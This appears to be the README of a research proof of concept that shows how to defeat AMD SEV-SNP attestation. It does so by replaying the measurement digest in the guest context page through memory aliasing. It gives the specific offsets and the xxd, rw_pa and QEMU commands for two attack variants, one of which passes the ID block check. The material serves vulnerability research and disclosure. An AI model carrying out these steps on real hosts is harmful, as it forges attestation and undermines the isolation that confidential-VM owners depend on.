# guest_context_replay

This manual describes two different attacks for replaying the measurement digest in the guest context.
The first attacks replay the launch digest during "runtime" and is sufficient to break all but the ID block based attestation checks.
The second attack can also defeat the ID block check.
The only differentiator between the two attacks is that the latter requires us to replay the guest context, after finalizing the measurements
but before calling the AMD-SP `SNP_LAUNCH_FINISH`.
The AMD-SP commands are issued by KVM.
However, KVM batches both `SNP_LAUNCH_FINISH` and measuring the initial vCPU state into the same userspace API call.
Thus, we need to modify the kernel code to do the replay to achieve the correct timing


## (Background) Determining the correct offset inside the guest context page
I modified QEMU [2] to dump the guest context page before every `SNP_LAUNCH_UPDATE` call.
Diffing the resulting files shows only one change, at offsets 0x460 to 0x490. 
These are 64 bytes. The measurement is only 48 bytes!

The data structures for the guest context page are defined in the AMD SP source code [1].
`typedef struct guest_context_page`. 
Here is the relevant excerpt
```C
  uint8_t imd[48];            /* The measurement of the Incoming Migration Image (IMI) */
  bool imi_en;                /* Indicates whether the current launch flow is an IMI migration or not */
  uint8_t measurement[48];    /* The measurement of every Launch Update page. luca(this is e.g. compared to the hash in the identity block)*/
  uint8_t gosvw[16];          /*
````
Since we see 64 bytes change, `measurment` is most likely not 16 byte aligned but overlaps into one of the other two fields.
I have not looked into figuring out the exact details.

## Attack 1: Replay at some point during "runtime"
To check that the attack works we need two different OVMF binaries.
It should be sufficient to just build OVMF twice using the scripts from the AMDSEV repo[3]. 

Apply the QEMU and Linux patches from [2]. We need the kernel modifications to ensure that sequentially
started VMs will use the same guest context page.

Attack flow

Boot the VM with the first OVMF variant
`sudo ./launch-qemu.sh -hda ./luca-snp-image.qcow2 -sev-snp -bios ./usr/local/share/qemu/`
The patched QEMU will create dump files of the guest context in the current directory.
Alternatively, you can also use the `rw_pa` [5] tool to capture the content manually.

Prepare the replay data with `xxd --seek 0x460 -l 0x40 -o -0x460  4KiB_DUMP_FILE | xxd -r  > gctx_replay_data.bin`. Using the QEMU variant, use the dump file with the highest number.


Inside the VM, query the attestation report with [4]

Boot with the second OVMF variant 
`sudo ./launch-qemu.sh -hda ./luca-snp-image.qcow2 -sev-snp -bios ./alternate-usr/local/share/qemu/`

Inside the VM, query the attestation report with [4
```
luca@sevvictim:~$ sudo ./query_attestation 
```
Since you booted with two different OVMF versions, you should see two different launch measurements. Keep the VM running.

Next perform the replay on the host
`sudo ./rw_pa --target-pa GCTX_PA_OFFSET_0x460  --bytes 0x30 --aliases BADRAM_ALIAS_CSV_FILE --use-alias --file gctx_replay_data.bin --mode REPLAY`.
Using the modified QEMU, it will output the GCTX PA on stdout ("Using 0x... for guest context page").

From the VM, query the attestation report again
```
luca@sevvictim:~$ sudo ./query_attestation 
```
Now, you should observe the same attestation report as with the first QEMU version that
you used for the first VM start.

## Attack 2: Replay exactly before SNP_LAUNCH_FINISH

Apply the QEMU and Linux patches from [2]. We need the kernel modifications to ensure that sequentially started VMs will use the same guest context page.

For this attack, you need to generate an ID block, since we want to use the ID block based attestation feature of SEV.

- Use the tool in [5] to generate the `id-block.txt` and `auth-block.txt` files for QEMU.
  - There is pre-generated key data in the `tests` folder
  - For the digest take the query attestation result form inside the vm and encode bytes as binary file 

1) Start the original VM with `sudo ./launch-qemu.sh -hda ./luca-snp-image.qcow2 -sev-snp` This will generate the `gctx-dump-XX.bin` files
2) Prepare the replay data with `xxd --seek 0x460 -l 0x40 -o -0x460  ~/AMDSEV/gctx-dump-07.bin | xxd -r  > ~/badram/binaries/replay-with-this.bin`. The "07" dump file is the last dump file, i.e. the one with the final measurement
3) Sanity Check: Start the VM with the other OVMF binary and the ID block but without replaying the data. The startup process should fail.
3) Start the rogue VM with `BADRAM_ALIAS_CSV=PATH BADRAM_REPLAY_DATA=PATH sudo -E ./launch-qemu.sh -hda ./luca-snp-image.qcow2   -bios alternate-usr/local/share/qemu/ -sev-snp -id-block PATH -id-auth PATH`. The first env var should point to the file with the badram address aliasing functions/mappings. The second env var should point to the file from step 2. You need to use the `launch-qemu.sh` file from this folder for the ID block options to be present. The expected outcome is that the VM boots because the modified QEMU took care of replaying the guest context page at the right point in time, such that the ID block check passes. After booting, you can also check  the attestation report like in the first attack.

## References

[1] https://github.com/amd/AMD-ASPFW
[2] see [`qemu-patches`] and [`kernel-patches`] folders
[3] https://github.com/AMDESE/AMDSEV/tree/snp-latest
[4] `sev-attacks/replay_vmsa/query_attestation`
[5] `sev-attacks/replay_vmsa/generate_id_block`
